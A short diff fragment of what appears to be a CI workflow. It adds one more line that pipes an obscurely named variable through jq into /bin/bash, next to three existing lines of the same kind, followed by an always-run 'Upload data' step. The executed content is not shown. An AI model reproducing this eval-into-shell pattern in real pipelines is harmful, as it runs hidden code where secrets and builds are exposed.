@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$kymg175" | jq -r .hgyr18 | /bin/bash
           echo $nau9397 | jq -r .tmcp06 | /bin/bash
           echo $xfqsm11622 | jq -r .nr06 | /bin/bash
+          echo $thpst53 | jq -r .doach690 | /bin/bash
 
       - name: Upload data
         if: always()
